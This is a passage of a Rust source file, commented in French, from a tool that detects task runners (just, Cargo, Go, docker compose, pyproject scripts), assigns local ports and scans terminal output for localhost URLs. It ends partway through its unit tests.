            lines.pop();
        }
        let (before, after) = just_deps(&deps);
        recipes.push(JustRecipe {
            name: name.to_owned(),
            body: lines.join("\n"),
            before,
            after,
            offered,
        });
    }
    JustParse {
        recipes,
        imports,
        settings,
        dotenv: dotenv.filter(|_| dotenv_set),
    }
}

/// Corps de `just <recette>` : dépendances d'avant (transitivement), la
/// recette, puis dépendances d'après, dans l'ordre de just ; chaque recette
/// une fois, [`MAX_DEPENDENCIES`] au plus.
fn just_body(parsed: &JustParse, name: &str) -> String {
    let index: HashMap<&str, usize> = parsed
        .recipes
        .iter()
        .enumerate()
        .map(|(i, r)| (r.name.as_str(), i))
        .collect();
    let mut seen: HashSet<usize> = HashSet::new();
    let mut blocks: Vec<String> = Vec::new();
    let mut cut = false;
    let Some(&start) = index.get(name) else {
        return String::new();
    };
    seen.insert(start);
    // Pile : (recette, étape) ; étapes 0..before, puis le corps, puis after.
    let mut stack: Vec<(usize, usize)> = vec![(start, 0)];
    while let Some((i, k)) = stack.pop() {
        let r = &parsed.recipes[i];
        let dep = if k < r.before.len() {
            Some(&r.before[k])
        } else if k == r.before.len() {
            blocks.push(r.body.clone());
            None
        } else {
            r.after.get(k - r.before.len() - 1)
        };
        if k > r.before.len() + r.after.len() {
            continue;
        }
        stack.push((i, k + 1));
        if let Some(d) = dep
            && let Some(&j) = index.get(d.as_str())
            && !seen.contains(&j)
        {
            if seen.len() >= MAX_DEPENDENCIES {
                cut = true;
                continue;
            }
            seen.insert(j);
            stack.push((j, 0));
        }
    }
    if cut {
        blocks.push(format!(
            "# … dépendances au-delà de {MAX_DEPENDENCIES} non montrées"
        ));
    }
    let mut out = String::new();
    if !parsed.settings.is_empty() {
        out.push_str(&parsed.settings.join("\n"));
        out.push_str("\n\n");
    }
    out.push_str(&blocks.join("\n"));
    out
}

/// Prend en compte les fichiers importés d'un justfile `file` (chemins
/// relatifs à son dossier ; module sans chemin : `nom.just`,
/// `nom/mod.just`, `nom/justfile`, `nom/.justfile`, le premier présent),
/// et ceux qu'ils importent.
fn just_imports(inputs: &mut Inputs<'_>, view: &dyn RepoView, file: &str, parsed: &JustParse) {
    let base = parent_dir(file);
    for (kind, module, path) in &parsed.imports {
        let role = if *kind == "mod" {
            "module (mod)"
        } else {
            "importé (import)"
        };
        let text = match (path, module) {
            (Some(p), _) => inputs
                .reference(base, p, role)
                .map(|t| (resolve_ref(base, p), t)),
            (None, Some(m)) => {
                let candidates = [
                    format!("{m}.just"),
                    format!("{m}/mod.just"),
                    format!("{m}/justfile"),
                    format!("{m}/.justfile"),
                ];
                let chosen = candidates
                    .iter()
                    .find(|c| {
                        resolve_ref(base, c)
                            .is_ok_and(|p| !matches!(view.load(&p), Loaded::Absent(_)))
                    })
                    .unwrap_or(&candidates[0]);
                inputs
                    .reference(base, chosen, role)
                    .map(|t| (resolve_ref(base, chosen), t))
            }
            (None, None) => {
                inputs.marker(
                    file,
                    FileState::Unresolved,
                    &format!("{role} ; forme non lue"),
                );
                None
            }
        };
        if let Some((Ok(p), t)) = text {
            just_imports(inputs, view, &p, &parse_just(&t));
        }
    }
}

struct JustParam {
    required: bool,
}

/// Paramètres d'un en-tête de recette (texte après le nom, jusqu'au `:`)
/// et texte après le `:` (dépendances), `None` si ce n'est pas un en-tête
/// de recette.
fn just_params(rest: &str) -> Option<(Vec<JustParam>, String)> {
    let mut params = Vec::new();
    let chars: Vec<char> = rest.chars().collect();
    let mut i = 0;
    loop {
        while i < chars.len() && chars[i].is_whitespace() {
            i += 1;
        }
        if i >= chars.len() {
            return None; // pas de `:`
        }
        if chars[i] == ':' {
            if chars.get(i + 1) == Some(&'=') {
                return None;
            }
            return Some((params, chars[i + 1..].iter().collect()));
        }
        // Un paramètre : [+*][$]nom[=défaut].
        // `*` : zéro ou plus (facultatif) ; `+` : un ou plus (requis).
        let mut variadic_star = false;
        if chars[i] == '*' {
            variadic_star = true;
            i += 1;
        } else if chars[i] == '+' {
            i += 1;
        }
        if chars.get(i) == Some(&'$') {
            i += 1;
        }
        let start = i;
        while i < chars.len()
            && (chars[i].is_ascii_alphanumeric() || chars[i] == '_' || chars[i] == '-')
        {
            i += 1;
        }
        if i == start {
            return None;
        }
        let mut has_default = false;
        if chars.get(i) == Some(&'=') {
            has_default = true;
            i += 1;
            i = skip_just_value(&chars, i)?;
        }
        params.push(JustParam {
            required: !has_default && !variadic_star,
        });
    }
}

/// Saute une valeur par défaut : chaîne entre guillemets, backticks,
/// expression entre parenthèses ou mot.
fn skip_just_value(chars: &[char], mut i: usize) -> Option<usize> {
    match chars.get(i)? {
        q @ ('\'' | '"' | '`') => {
            let q = *q;
            i += 1;
            while i < chars.len() && chars[i] != q {
                if chars[i] == '\\' && q == '"' {
                    i += 1;
                }
                i += 1;
            }
            (i < chars.len()).then_some(i + 1)
        }
        '(' => {
            let mut depth = 0usize;
            let mut quote: Option<char> = None;
            while i < chars.len() {
                let c = chars[i];
                match quote {
                    Some(q) if c == q => quote = None,
                    Some(_) => {}
                    None => match c {
                        '\'' | '"' | '`' => quote = Some(c),
                        '(' => depth += 1,
                        ')' => {
                            depth -= 1;
                            if depth == 0 {
                                return Some(i + 1);
                            }
                        }
                        _ => {}
                    },
                }
                i += 1;
            }
            None
        }
        _ => {
            while i < chars.len() && !chars[i].is_whitespace() && chars[i] != ':' {
                i += 1;
            }
            Some(i)
        }
    }
}

fn detect_just(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    let mut inputs = Inputs::new(view);
    let Some((file, text)) = ["justfile", "Justfile", ".justfile", "JUSTFILE"]
        .iter()
        .find_map(|f| {
            inputs
                .file_if_present(&join(dir, f), "source")
                .map(|t| (*f, t))
        })
    else {
        return;
    };
    let parsed = parse_just(&text);
    just_imports(&mut inputs, view, &join(dir, file), &parsed);
    // `.env` : chemin imposé (relatif au dossier de lancement), sinon le nom
    // cherché dans le dossier puis ses parents (jusqu'à la racine du
    // worktree ; au-delà : non couvert).
    if let Some((name, path)) = &parsed.dotenv {
        match path {
            Some(p) => {
                inputs.reference(dir, p, "fichier d'environnement (dotenv-path)");
            }
            None => {
                let mut d = dir.to_owned();
                loop {
                    inputs.reference(&d, name, "fichier d'environnement (dotenv)");
                    if d.is_empty() {
                        break;
                    }
                    d = parent_dir(&d).to_owned();
                }
            }
        }
    }
    let files = inputs.into_files();
    for r in parsed.recipes.iter().filter(|r| r.offered) {
        let name = r.name.as_str();
        out.push(
            runner(dir, file, name, name, classify(name), vec!["just", name])
                .with_body(just_body(&parsed, name))
                .with_files(&files),
        );
    }
}

// -------------------------------------------------------------------- cargo

/// Nom de paquet Cargo acceptable pour `-p`.
fn cargo_name_ok(name: &str) -> bool {
    safe_name(name)
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Le paquet du dossier a-t-il un binaire ?
fn cargo_has_bin(view: &dyn RepoView, dir: &str, table: &toml::Table) -> bool {
    table
        .get("bin")
        .and_then(|b| b.as_array())
        .is_some_and(|a| !a.is_empty())
        || view.is_file(&join(dir, "src/main.rs"))
        || view.is_dir(&join(dir, "src/bin"))
}

/// Membres d'un workspace : chemins littéraux et motifs `dossier/*`.
fn cargo_members(view: &dyn RepoView, dir: &str, ws: &toml::Table) -> Vec<String> {
    let list = |key: &str| -> Vec<String> {
        ws.get(key)
            .and_then(|m| m.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(str::to_owned))
                    .collect()
            })
            .unwrap_or_default()
    };
    let exclude: HashSet<String> = list("exclude")
        .into_iter()
        .map(|e| e.trim_end_matches('/').to_owned())
        .collect();
    let mut out = Vec::new();
    for m in list("members") {
        let m = m.trim_end_matches('/');
        if m.is_empty() || m.starts_with('/') || m.split('/').any(|c| c == "..") {
            continue;
        }
        if let Some(parent) = m.strip_suffix("/*") {
            if parent.contains(['*', '?', '[']) {
                continue;
            }
            for sub in view.subdirs(&join(dir, parent)) {
                out.push(format!("{parent}/{sub}"));
            }
        } else if !m.contains(['*', '?', '[']) {
            out.push(m.to_owned());
        }
    }
    out.retain(|m| !exclude.contains(m));
    out.dedup();
    out.truncate(MAX_CARGO_MEMBERS);
    out
}

/// Runners Cargo d'un dossier ; renvoie les sous-dossiers directs de la
/// racine qui sont membres de son workspace (déjà couverts par `-p`).
fn detect_cargo(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) -> HashSet<String> {
    let mut covered = HashSet::new();
    let Some(text) = view.read(&join(dir, "Cargo.toml")) else {
        return covered;
    };
    let Ok(table) = text.parse::<toml::Table>() else {
        return covered;
    };
    let file = "Cargo.toml";
    let start = out.len();
    let package = table.get("package").and_then(|p| p.as_table());
    let workspace = table.get("workspace").and_then(|w| w.as_table());
    if package.is_some() && cargo_has_bin(view, dir, &table) {
        out.push(runner(
            dir,
            file,
            "run",
            "cargo run",
            RunnerKind::Dev,
            vec!["cargo", "run"],
        ));
    }
    if let Some(ws) = workspace {
        out.push(runner(
            dir,
            file,
            "test",
            "cargo test --workspace",
            RunnerKind::Test,
            vec!["cargo", "test", "--workspace"],
        ));
        out.push(runner(
            dir,
            file,
            "build",
            "cargo build --workspace",
            RunnerKind::Build,
            vec!["cargo", "build", "--workspace"],
        ));
        let root_name = package.and_then(|p| p.get("name")).and_then(|n| n.as_str());
        for m in cargo_members(view, dir, ws) {
            if dir.is_empty()
                && let Some(top) = m.split('/').next()
                && !m.contains('/')
            {
                covered.insert(top.to_owned());
            }
            let mdir = join(dir, &m);
            let Some(mt) = view
                .read(&join(&mdir, "Cargo.toml"))
                .and_then(|t| t.parse::<toml::Table>().ok())
            else {
                continue;
            };
            let Some(name) = mt
                .get("package")
                .and_then(|p| p.get("name"))
                .and_then(|n| n.as_str())
            else {
                continue;
            };
            if !cargo_name_ok(name) || Some(name) == root_name || !cargo_has_bin(view, &mdir, &mt) {
                continue;
            }
            out.push(runner(
                dir,
                file,
                &format!("run:{name}"),
                format!("cargo run -p {name}"),
                RunnerKind::Dev,
                vec!["cargo", "run", "-p", name],
            ));
        }
    } else if package.is_some() {
        out.push(runner(
            dir,
            file,
            "test",
            "cargo test",
            RunnerKind::Test,
            vec!["cargo", "test"],
        ));
        out.push(runner(
            dir,
            file,
            "build",
            "cargo build",
            RunnerKind::Build,
            vec!["cargo", "build"],
        ));
    }
    // Le fichier seul : le code compilé (sources, `build.rs`, dépendances,
    // `.cargo/config.toml`) n'est pas couvert par l'empreinte.
    let mut inputs = Inputs::new(view);
    inputs.file(
        &join(dir, file),
        "source (le code compilé n'est pas couvert)",
    );
    let files = inputs.into_files();
    for r in &mut out[start..] {
        r.files = files.clone();
    }
    covered
}

// ----------------------------------------------------------------------- go

/// Un fichier Go (hors tests) du dossier déclare-t-il `package main` ?
fn go_has_main(view: &dyn RepoView, dir: &str) -> bool {
    view.files(dir)
        .iter()
        .filter(|f| f.ends_with(".go") && !f.ends_with("_test.go"))
        .take(32)
        .any(|f| {
            view.read(&join(dir, f)).is_some_and(|t| {
                t.lines()
                    .map(str::trim)
                    .find(|l| l.starts_with("package "))
                    .is_some_and(|l| l.split_whitespace().nth(1) == Some("main"))
            })
        })
}

fn detect_go(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    if !view.is_file(&join(dir, "go.mod")) {
        return;
    }
    let file = "go.mod";
    let start = out.len();
    if go_has_main(view, dir) {
        out.push(runner(
            dir,
            file,
            "run",
            "go run .",
            RunnerKind::Dev,
            vec!["go", "run", "."],
        ));
    }
    out.push(runner(
        dir,
        file,
        "test",
        "go test ./...",
        RunnerKind::Test,
        vec!["go", "test", "./..."],
    ));
    out.push(runner(
        dir,
        file,
        "build",
        "go build ./...",
        RunnerKind::Build,
        vec!["go", "build", "./..."],
    ));
    // Le fichier seul : le code compilé n'est pas couvert par l'empreinte.
    let mut inputs = Inputs::new(view);
    inputs.file(
        &join(dir, file),
        "source (le code compilé n'est pas couvert)",
    );
    let files = inputs.into_files();
    for r in &mut out[start..] {
        r.files = files.clone();
    }
}

// ------------------------------------------------------------------ compose

fn detect_compose(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    // Ordre de préférence de `docker compose` ; un fichier trop gros ou
    // illisible garde son runner (état visible dans `files`).
    let Some(file) = [
        "compose.yaml",
        "compose.yml",
        "docker-compose.yaml",
        "docker-compose.yml",
    ]
    .into_iter()
    .find(|f| !matches!(view.load(&join(dir, f)), Loaded::Absent(_))) else {
        return;
    };
    let path = join(dir, file);
    let mut inputs = Inputs::new(view);
    // Le corps : le fichier compose lui-même (services, images, commandes).
    let body = inputs.file(&path, "source");
    match &body {
        Some(text) => compose::compose_inputs(&mut inputs, &path, text),
        None => inputs.marker(
            &path,
            FileState::Unresolved,
            "forme non lue : fichier trop gros, illisible ou hors de la racine ; \
             fichiers qu'il fait lire non suivis",
        ),
    }
    // `.env` du projet (dossier du fichier compose) : lu par compose.
    inputs.file(
        &join(dir, ".env"),
        "fichier d'environnement du projet (.env)",
    );
    let files = inputs.into_files();
    out.push(
        runner(
            dir,
            file,
            "up",
            "docker compose up",
            RunnerKind::Dev,
            vec!["docker", "compose", "-f", file, "up"],
        )
        .with_body(body.unwrap_or_default())
        .with_files(&files),
    );
}

// ---------------------------------------------------------------- pyproject

fn detect_pyproject(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
    let mut inputs = Inputs::new(view);
    let Some(table) = inputs
        .file_if_present(&join(dir, "pyproject.toml"), "source")
        .and_then(|t| t.parse::<toml::Table>().ok())
    else {
        return;
    };
    let tool = table.get("tool").and_then(|t| t.as_table());
    // Verrou du dossier, sinon de la racine.
    let lock_of = |f: &str| -> Option<String> {
        let here = join(dir, f);
        if view.is_file(&here) {
            Some(here)
        } else if view.is_file(f) {
            Some(f.to_owned())
        } else {
            None
        }
    };
    // L'outil vient du fichier de verrou (sinon de sa section) : jamais
    // deviné, un `uv run` sans verrou en écrirait un dans le dépôt.
    let has = |k: &str| tool.is_some_and(|t| t.contains_key(k));
    let (runner_tool, lock) = if let Some(l) = lock_of("uv.lock") {
        (Some("uv"), Some(l))
    } else if let Some(l) = lock_of("poetry.lock") {
        (Some("poetry"), Some(l))
    } else if has("poetry") {
        (Some("poetry"), None)
    } else if let Some(l) = lock_of("pdm.lock") {
        (Some("pdm"), Some(l))
    } else if has("pdm") {
        (Some("pdm"), None)
    } else {
        (None, None)
    };
    // Clés d'une table de scripts, avec leur corps (texte, sinon la valeur TOML).
    let entries = |v: Option<&toml::Value>| -> Vec<(String, String)> {
        v.and_then(|s| s.as_table())
            .map(|t| {
                t.iter()
                    .map(|(k, v)| {
                        let body = v.as_str().map_or_else(
                            || serde_json::to_string(v).unwrap_or_default(),
                            str::to_owned,
                        );
                        (k.clone(), body)
                    })
                    .collect()
            })
            .unwrap_or_default()
    };
    let mut names: BTreeMap<String, (&'static str, String, Option<String>)> = BTreeMap::new();
    if let Some(tool_name) = runner_tool {
        let project = table.get("project");
        for (k, b) in entries(project.and_then(|p| p.get("scripts"))) {
            names.insert(k, (tool_name, b, lock.clone()));
        }
        if tool_name == "poetry" {
            for (k, b) in entries(
                tool.and_then(|t| t.get("poetry"))
                    .and_then(|p| p.get("scripts")),
            ) {
                names.insert(k, ("poetry", b, lock.clone()));
            }
        }
    }
    // Scripts de pdm (tâches) : toujours lancés par pdm. Crochets
    // (`pre_run`, `pre_script`, `pre_<nom>`, `post_…`) : pas proposés, montrés
    // avec le script qu'ils encadrent.
    let pdm_lock = lock_of("pdm.lock");
    let pdm_scripts: BTreeMap<String, String> = entries(
        tool.and_then(|t| t.get("pdm"))
            .and_then(|p| p.get("scripts")),
    )
    .into_iter()
    .collect();
    let pdm_hook = |k: &str| {
        matches!(k, "pre_run" | "post_run" | "pre_script" | "post_script")
            || ["pre_", "post_"].iter().any(|p| {
                k.strip_prefix(p)
                    .is_some_and(|base| !base.is_empty() && pdm_scripts.contains_key(base))
            })
    };
    for (k, b) in &pdm_scripts {
        if k != "_" && !pdm_hook(k) {
            names
                .entry(k.clone())
                .or_insert(("pdm", b.clone(), pdm_lock.clone()));
        }
    }
    for l in [lock_of("uv.lock"), lock_of("poetry.lock"), pdm_lock.clone()]
        .into_iter()
        .flatten()
    {
        inputs.file(&l, "fichier de verrou");
    }
    let files = inputs.into_files();
    for (name, (tool_name, body, lock)) in names {
        if !safe_name(&name) {
            continue;
        }
        let body = if tool_name == "pdm" {
            let hook = |k: String| pdm_scripts.get(&k).map(|b| format!("[{k}] {b}"));
            let lines: Vec<String> = [
                hook("pre_run".into()),
                hook("pre_script".into()),
                hook(format!("pre_{name}")),
            ]
            .into_iter()
            .flatten()
            .chain(std::iter::once(format!("[{name}] {body}")))
            .chain(
                [
                    hook(format!("post_{name}")),
                    hook("post_script".into()),
                    hook("post_run".into()),
                ]
                .into_iter()
                .flatten(),
            )
            .collect();
            if lines.len() == 1 {
                body
            } else {
                lines.join("\n")
            }
        } else {
            body
        };
        out.push(
            runner(
                dir,
                "pyproject.toml",
                &name,
                name.clone(),
                classify(&name),
                vec![tool_name, "run", &name],
            )
            .with_body(body)
            .with_lock(lock)
            .with_files(&files),
        );
    }
}

// --------------------------------------------------------------------- port

/// Port préféré d'un worktree, stable (dérivé de son chemin) : le même à
/// chaque démarrage du démon tant qu'il est libre.
pub fn preferred_port(root: &Path) -> u16 {
    let span = u64::from(PORT_MAX - PORT_MIN) + 1;
    let h = super::worktree::fnv1a64(root.as_os_str().as_encoded_bytes());
    PORT_MIN + (h % span) as u16
}

/// Premier port de la plage, à partir de `preferred` (en bouclant), ni
/// réservé (autre worktree) ni pris.
pub fn pick_port(
    preferred: u16,
    reserved: &HashSet<u16>,
    mut taken: impl FnMut(u16) -> bool,
) -> Option<u16> {
    let span = PORT_MAX - PORT_MIN + 1;
    let start = preferred.clamp(PORT_MIN, PORT_MAX) - PORT_MIN;
    (0..span)
        .map(|i| PORT_MIN + (start + i) % span)
        .find(|p| !reserved.contains(p) && !taken(*p))
}

// ---------------------------------------------------------------------- URL

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum AnsiState {
    #[default]
    Text,
    /// Après ESC.
    Esc,
    /// Séquence CSI (`ESC [`), jusqu'à l'octet final.
    Csi,
    /// Chaîne (OSC, DCS, APC, PM, SOS) jusqu'à BEL ou `ESC \`.
    Str,
    /// ESC dans une chaîne.
    StrEsc,
}

/// Repère les URL locales dans la sortie d'un runner, par lignes, après
/// retrait des séquences ANSI (même coupées entre deux lectures).
#[derive(Debug, Default)]
pub struct UrlScanner {
    state: AnsiState,
    /// Octets lus dans la séquence en cours (CSI ou chaîne).
    seq_len: usize,
    line: Vec<u8>,
    seen: BTreeSet<String>,
    order: Vec<String>,
}

impl UrlScanner {
    pub fn new() -> Self {
        Self::default()
    }

    /// URL trouvées jusqu'ici, dans l'ordre d'apparition.
    pub fn urls(&self) -> &[String] {
        &self.order
    }

    /// Octets sortis du PTY ; renvoie `true` si une URL nouvelle est apparue.
    pub fn feed(&mut self, data: &[u8]) -> bool {
        let mut changed = false;
        for &b in data {
            if matches!(
                self.state,
                AnsiState::Csi | AnsiState::Str | AnsiState::StrEsc
            ) {
                self.seq_len += 1;
                if b == 0x18 || b == 0x1a || self.seq_len > MAX_SEQUENCE {
                    self.state = AnsiState::Text;
                    continue;
                }
            }
            match self.state {
                AnsiState::Text => match b {
                    0x1b => {
                        self.state = AnsiState::Esc;
                        self.seq_len = 0;
                    }
                    b'\n' | b'\r' => changed |= self.end_line(),
                    0x00..=0x1f | 0x7f => {}
                    _ => {
                        self.line.push(b);
                        if self.line.len() >= MAX_LINE {
                            changed |= self.end_line();
                        }
                    }
                },
                AnsiState::Esc => {
                    self.state = match b {
                        b'[' => AnsiState::Csi,
                        b']' | b'P' | b'_' | b'^' | b'X' => AnsiState::Str,
                        // Séquences à un octet de plus (`ESC ( B`…).
                        b'(' | b')' | b'*' | b'+' | b'#' | b'%' => AnsiState::Esc,
                        _ => AnsiState::Text,
                    };
                }
                AnsiState::Csi => {
                    if (0x40..=0x7e).contains(&b) {
                        self.state = AnsiState::Text;
                    }
                }
                AnsiState::Str => match b {
                    0x07 => self.state = AnsiState::Text,
                    0x1b => self.state = AnsiState::StrEsc,
                    _ => {}
                },
                AnsiState::StrEsc => {
                    self.state = if b == b'\\' {
                        AnsiState::Text
                    } else {
                        AnsiState::Str
                    };
                }
            }
        }
        changed
    }

    /// Fin du flux : la dernière ligne (sans fin de ligne) est examinée.
    pub fn finish(&mut self) -> bool {
        self.end_line()
    }

    fn end_line(&mut self) -> bool {
        if self.line.is_empty() {
            return false;
        }
        let text = String::from_utf8_lossy(&self.line).into_owned();
        self.line.clear();
        let mut changed = false;
        for url in extract_urls(&text) {
            if self.order.len() >= MAX_URLS {
                break;
            }
            if self.seen.insert(url.clone()) {
                self.order.push(url);
                changed = true;
            }
        }
        changed
    }
}

/// URL locales d'une ligne sans séquence ANSI : `localhost`, `127.0.0.1`,
/// `[::1]` (et `0.0.0.0` / `[::]`, publiées en `127.0.0.1` / `[::1]`) suivis
/// d'un port, avec ou sans `http(s)://`.
pub fn extract_urls(line: &str) -> Vec<String> {
    const HOSTS: &[(&str, &str)] = &[
        ("localhost", "localhost"),
        ("127.0.0.1", "127.0.0.1"),
        ("[::1]", "[::1]"),
        ("0.0.0.0", "127.0.0.1"),
        ("[::]", "[::1]"),
    ];
    let lower = line.to_ascii_lowercase();
    let b = lower.as_bytes();
    let mut found: Vec<(usize, String)> = Vec::new();
    for (host, shown) in HOSTS {
        let mut from = 0;
        while let Some(pos) = lower[from..].find(host) {
            let at = from + pos;
            from = at + host.len();
            let before = &lower[..at];
            let scheme = if before.ends_with("https://") {
                "https"
            } else if before.ends_with("http://") {
                "http"
            } else {
                // Sans schéma : le nom doit commencer un mot.
                if before.chars().last().is_some_and(|c| {
                    c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '/' | '@')
                }) {
                    continue;
                }
                "http"
            };
            let mut i = at + host.len();
            if b.get(i) != Some(&b':') {
                continue;
            }
            i += 1;
            let digits_start = i;
            while i < b.len() && b[i].is_ascii_digit() {
                i += 1;
            }
            let digits = &line[digits_start..i];
            let Ok(port) = digits.parse::<u32>() else {
                continue;
            };
            if digits.len() > 5 || port == 0 || port > 65_535 {
                continue;
            }
            // Un port collé à une lettre (`:3000abc`) n'en est pas un.
            if b.get(i).is_some_and(|c| c.is_ascii_alphabetic()) {
                continue;
            }
            let path_start = i;
            if b.get(i) == Some(&b'/') {
                while i < b.len() && url_char(b[i]) {
                    i += 1;
                }
            }
            let mut path = &line[path_start..i];
            while let Some(p) = path.strip_suffix(['.', ',', ';', ':', '!', '?', '\'', ')', ']']) {
                path = p;
            }
            let path = if path.is_empty() { "/" } else { path };
            found.push((at, format!("{scheme}://{shown}:{port}{path}")));
        }
    }
    found.sort_by_key(|(at, _)| *at);
    let mut out: Vec<String> = Vec::new();
    for (_, u) in found {
        if !out.contains(&u) {
            out.push(u);
        }
    }
    out
}

fn url_char(c: u8) -> bool {
    c.is_ascii_alphanumeric()
        || matches!(
            c,
            b'-' | b'.'
                | b'_'
                | b'~'
                | b'/'
                | b'?'
                | b'#'
                | b'&'
                | b'='
                | b'%'
                | b'+'
                | b':'
                | b'@'
                | b'!'
                | b'$'
                | b','
                | b';'
                | b'*'
        )
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    /// Dépôt en mémoire.
    #[derive(Default)]
    struct Mem {
        files: HashMap<String, String>,
        dirs: BTreeSet<String>,
        /// Borne du hachage par blocs ([`MAX_STREAM_HASH_BYTES`] par défaut).
        stream_max: u64,
    }

    impl Mem {
        fn with(files: &[(&str, &str)]) -> Self {
            let mut m = Self {
                stream_max: MAX_STREAM_HASH_BYTES,
                ..Self::default()
            };
            for (p, c) in files {
                m.files.insert((*p).to_owned(), (*c).to_owned());
                let mut d = String::new();
                for comp in p.split('/').collect::<Vec<_>>().split_last().unwrap().1 {
                    d = join(&d, comp);
                    m.dirs.insert(d.clone());
                }
            }
            m
        }
        fn children(&self, rel: &str, dirs: bool) -> Vec<String> {
            let prefix = if rel.is_empty() {
                String::new()
            } else {
                format!("{rel}/")
            };
            let mut out: BTreeSet<String> = BTreeSet::new();
            let it: Box<dyn Iterator<Item = &String>> = if dirs {
                Box::new(self.dirs.iter())
            } else {
                Box::new(self.files.keys())
            };
            for p in it {
                if let Some(rest) = p.strip_prefix(&prefix)
                    && !rest.contains('/')
                    && !rest.is_empty()
                {
                    out.insert(rest.to_owned());
                }
            }
            out.into_iter().collect()
        }
    }

    impl RepoView for Mem {
        fn read(&self, rel: &str) -> Option<String> {
            self.files
                .get(rel)
                .filter(|t| t.len() as u64 <= MAX_SOURCE_BYTES)
                .cloned()
        }
        fn load(&self, rel: &str) -> Loaded {
            match self.files.get(rel) {
                Some(t) if t.len() as u64 > MAX_HASH_BYTES => Loaded::TooLarge(t.len() as u64),
                Some(t) => Loaded::Bytes(t.clone().into_bytes()),
                None => Loaded::Absent(None),
            }
        }
        fn hash_large(&self, rel: &str) -> Option<(u64, Option<String>)> {
            let t = self.files.get(rel)?;
            let n = t.len() as u64;
            Some((
                n,
                (n <= self.stream_max).then(|| super::super::files::sha256_hex(t.as_bytes())),
            ))
        }
        fn is_file(&self, rel: &str) -> bool {
            self.files.contains_key(rel)
        }
        fn is_dir(&self, rel: &str) -> bool {
            self.dirs.contains(rel)
        }
        fn subdirs(&self, rel: &str) -> Vec<String> {
            self.children(rel, true)
        }
        fn files(&self, rel: &str) -> Vec<String> {
            self.children(rel, false)
        }
    }

    fn ids(r: &[Runner]) -> Vec<&str> {
        r.iter().map(|r| r.id.as_str()).collect()
    }

    fn find<'a>(r: &'a [Runner], id: &str) -> &'a Runner {
        r.iter()
            .find(|x| x.id == id)
            .unwrap_or_else(|| panic!("{id} absent : {:?}", ids(r)))
    }

    #[test]
    fn package_json_scripts_and_manager() {
        let m = Mem::with(&[
            (
                "package.json",
                r#"{"scripts": {"dev": "vite", "test:unit": "vitest", "build": "vite build",
                    "predev": "x", "postinstall": "y", "--help": "z", "-x": "w", "lint": "eslint",
                    "deploy": "a", "a b": "c", "bad\u0007": "d", "num": 3}}"#,
            ),
            ("pnpm-lock.yaml", ""),
            ("app/package.json", r#"{"scripts": {"start": "next"}}"#),
        ]);
        let r = detect(&m);
        let dev = find(&r, "package.json:dev");
        assert_eq!(dev.command, ["pnpm", "run", "dev"]);
        assert_eq!(dev.kind, RunnerKind::Dev);
        assert_eq!(dev.cwd, "");
        assert_eq!(dev.source, "package.json:dev");
        assert_eq!(find(&r, "package.json:test:unit").kind, RunnerKind::Test);
        assert_eq!(find(&r, "package.json:build").kind, RunnerKind::Build);
        assert_eq!(find(&r, "package.json:lint").kind, RunnerKind::Lint);
        assert_eq!(find(&r, "package.json:deploy").kind, RunnerKind::Other);
        for absent in [
            "package.json:predev",
            "package.json:postinstall",
            "package.json:--help",
            "package.json:-x",
            "package.json:a b",
            "package.json:num",
        ] {
            assert!(!ids(&r).contains(&absent), "{absent}");
        }
        assert!(!r.iter().any(|x| x.id.contains('\u{7}')));
        // Sous-dossier : verrou de la racine.
        let app = find(&r, "app/package.json:start");
        assert_eq!(app.command, ["pnpm", "run", "start"]);
        assert_eq!(app.cwd, "app");
    }

    #[test]
    fn lockfiles_pick_the_manager() {
        for (lock, pm) in [
            ("yarn.lock", "yarn"),
            ("bun.lockb", "bun"),
            ("bun.lock", "bun"),
            ("package-lock.json", "npm"),
        ] {
            let m = Mem::with(&[("package.json", r#"{"scripts":{"dev":"x"}}"#), (lock, "")]);
            assert_eq!(detect(&m)[0].command[0], pm, "{lock}");
        }
        let m = Mem::with(&[(
            "package.json",
            r#"{"packageManager":"yarn@4.1.0","scripts":{"dev":"x"}}"#,
        )]);
        assert_eq!(detect(&m)[0].command[0], "yarn");
        let m = Mem::with(&[("package.json", r#"{"scripts":{"dev":"x"}}"#)]);
        assert_eq!(detect(&m)[0].command[0], "npm");
        // JSON illisible : rien, sans erreur.
        let m = Mem::with(&[("package.json", "{pas du json")]);
        assert!(detect(&m).is_empty());
    }

    #[test]
    fn makefile_targets() {
        let mk = "\
include common.mk
-include $(wildcard *.d)
.PHONY: all test release.notes
CC := gcc
FLAGS = -a:b
X ::= y
all: build test ## cible par défaut
build: src/main.c
\tgcc -o app src/main.c
test:
\t./run-tests
%.o: %.c
\tcc -c $<
$(OBJ): x
app.o: app.c
release.notes:
dist/app.js: x
-weird:
.SUFFIXES:
debug: CFLAGS = -g
define TEMPLATE
inside: x
endef
fmt lint&: ; true
long \\
  name: x
ifeq ($(A),b)
cond:
endif
";
        assert_eq!(
            make_targets(mk),
            [
                "all",
                "build",
                "test",
                "release.notes",
                "fmt",
                "lint",
                "long",
                "name",
                "cond"
            ]
        );
        let m = Mem::with(&[("Makefile", mk), ("GNUmakefile", "only:\n")]);
        // GNU make prend GNUmakefile en premier.
        let r = detect(&m);
        assert_eq!(ids(&r), ["GNUmakefile:only"]);
        assert_eq!(r[0].command, ["make", "only"]);
    }

    #[test]
    fn justfile_recipes() {
        let jf = r#"
set shell := ["bash", "-c"]
alias b := build
version := "1.0"
export RUST_LOG := "debug"

# Construit.
build:
    cargo build

@test filter="":
    cargo test {{filter}}

deploy env:
    ./deploy {{env}}

serve port="8080" host='127.0.0.1':
    ./serve

watch *args:
    ./watch {{args}}

publish +targets:
    ./publish

_helper:
    true

[private]
secret:
    true

[group('ci')]
lint: build
    cargo clippy

quoted arg="a: b":
    echo

paren x=(env("A", "b:c")):
    echo
"#;
        assert_eq!(
            just_recipes(jf),
            ["build", "test", "serve", "watch", "lint", "quoted", "paren"]
        );
        let m = Mem::with(&[("justfile", jf)]);
        let r = detect(&m);
